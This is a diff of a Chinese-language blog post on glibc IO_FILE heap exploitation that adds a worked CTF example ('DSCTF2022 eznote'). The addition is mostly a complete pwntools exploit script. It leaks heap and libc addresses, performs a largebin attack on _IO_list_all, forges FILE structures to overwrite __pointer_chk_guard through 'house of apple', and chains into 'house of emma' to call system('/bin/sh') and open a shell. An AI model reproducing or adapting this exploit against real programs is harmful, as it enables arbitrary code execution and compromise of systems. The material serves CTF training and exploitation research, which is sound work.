@@ -64,7 +64,146 @@ fake_io += p64(libc_base+0x1e1c60)  #vtable -> _IO_wstrn_jumps
 
 这样的效果就是把``_wide_data``到``_wide_data+0x38``替换为已知堆地址，相当于实现了多次largebinAttack。
 
-虽然感觉用处不是很大，但是这样做的好处是`_chian`也是可控的，可以布置IO链配合其他house的方法多次调用，例如配合house of emma ，用house of apple来修改pointer_guard，house of emma拿到shell。
+~~虽然感觉用处不是很大，~~非常好用！！（具体看下面的例题）好处是`_chian`也是可控的，可以布置IO链配合其他house的方法多次调用，例如配合house of emma ，用house of apple来修改pointer_guard，house of emma拿到shell。
+
+## 0x03 例题
+
+> DSCTF2022 eznote
+
+house of apple改`__pointer_chk_guard `同时控制`_chain`，之后通过`_chain`无缝衔接到house of emma。
+
+````python
+# -*- coding: utf-8 -*-
+from pwn import *
+context(os='linux',arch='amd64')
+context.log_level = 'debug'
+
+elf = ELF("./eznote")
+
+local = 1
+
+if local:
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    p = process("./eznote")    
+else:
+    libc = ELF('./libc.so.6')
+    p = remote("","")
+
+def debug(p):
+    if local:
+        gdb.attach(p)
+    else:
+        pass
+
+def cmd(i):
+    p.sendlineafter(">",str(i))
+
+def add(size,data):
+    cmd(1)
+    p.sendlineafter("Size:",str(size))
+    p.sendlineafter("Content:",data)
+
+def show(idx):
+    cmd(4)
+    p.sendlineafter("Idx:",str(idx))
+
+def delete(idx):
+    cmd(2)
+    p.sendlineafter("Idx:",str(idx))
+
+def edit(idx,data):
+    cmd(3)
+    p.sendlineafter("Idx:",str(idx))
+    p.sendlineafter("Content:",data)
+
+def ROL(content, key):
+    tmp = bin(content)[2:].rjust(64, '0')
+    return int(tmp[key:] + tmp[:key], 2)
+
+
+add(0x420,'0'*0x30)#0
+add(0x420,'1'*0x30)#1
+add(0x420,'2'*0x30)#2
+add(0x410,'3'*0x30)#3
+add(0x420,'4'*0x30)#4
+add(0x420,'5'*0x30)#5
+add(0x420,'6'*0x30)#6 
+add(0x861,"/bin/sh\x00")#7 == 3*430 
+
+show(0)
+p.recvuntil("Note0:\n")
+heap_base = u64(p.recv(6).ljust(8,b"\x00"))-0x20a0+0x10
+log.success("Heap_base ==> "+hex(heap_base))
+delete(0)
+add(0x420,'0'*0x30)#0
+show(1)
+p.recvuntil("Note1:\n")
+libc_base = u64(p.recv(6).ljust(8,b"\x00"))-0x219ce0
+log.success("Libc_base ==> "+hex(libc_base))
+
+fake_io = p64(0) #_IO_read_end
+fake_io += p64(0) #_IO_read_base
+fake_io += p64(0) #_IO_write_base
+fake_io += p64(1) #_IO_write_ptr  #write_ptr > write_base
+fake_io += p64(0) #_IO_write_end
+fake_io += p64(0) #_IO_buf_base
+fake_io += p64(0) #_IO_buf_end
+fake_io += p64(0) #_IO_save_base
+fake_io += p64(0) #_IO_backup_base
+fake_io += p64(0) #_IO_save_end
+fake_io += p64(0) #_markers 
+fake_io += p64(heap_base+0x1840) #_chain => [new]chunk3
+fake_io += p32(0) #_fileno 
+fake_io += p32(8) #_flags2   #bypass _flag2&8 == 0
+fake_io += p64(0) #_old_offset
+fake_io += p64(0) #_vtable_offset
+fake_io += p64(0) #_lock
+fake_io += p64(0) #_offset
+fake_io += p64(0) #_codecvt
+fake_io += p64(libc_base-0x2890)  #_wide_data -> __pointer_chk_guard
+fake_io += p64(0) #_freeres_list
+fake_io += p64(0) #_freeres_buf
+fake_io += p64(0)*4 #__pad5
+fake_io += p64(libc_base+0x215dc0)  #vtable -> _IO_wstrn_jumps
+
+edit(3,fake_io)
+
+delete(4)
+delete(5)
+delete(6)
+add(0x430,'4'*0x30)#4
+delete(3)
+io_list_all = libc_base+0x21a680
+edit(1,p64(libc_base+0x21a0d0)*2+p64(0)+p64(io_list_all-0x20))
+
+key = heap_base+0x10c0
+io_cookie_jumps = libc_base+0x215b80
+target = libc_base+0x50d60 # libc.sym['system']
+fake_IO_FILE = p64(0x00000000fbad2087)+3 * p64(0)
+fake_IO_FILE += p64(0)  # _IO_write_base = 0
+fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
+fake_IO_FILE += p64(0)
+fake_IO_FILE += p64(0)  # _IO_buf_base
+fake_IO_FILE += p64(0)  # _IO_buf_end
+fake_IO_FILE += p64(0)*4
+fake_IO_FILE += p64(0)  # _chain
+fake_IO_FILE += p64(0)*3
+fake_IO_FILE += p64(libc_base+0x2204a0)  # _lock = writable address
+fake_IO_FILE += p64(0)*7
+fake_IO_FILE += p64(0)  # _mode = 0
+fake_IO_FILE += p64(0)
+fake_IO_FILE += p64(io_cookie_jumps + 0x60)  # vtable
+fake_IO_FILE += p64(heap_base+0x2090)  # rdi '/bin/sh\x00'
+fake_IO_FILE += p64(0)
+fake_IO_FILE += p64(ROL(target^key,0x11))
+
+add(0x430,fake_IO_FILE)
+
+p.sendlineafter(">","5")
+
+# debug(p)
+p.interactive()
+````
 
 ## 0xFF 参考连接
 
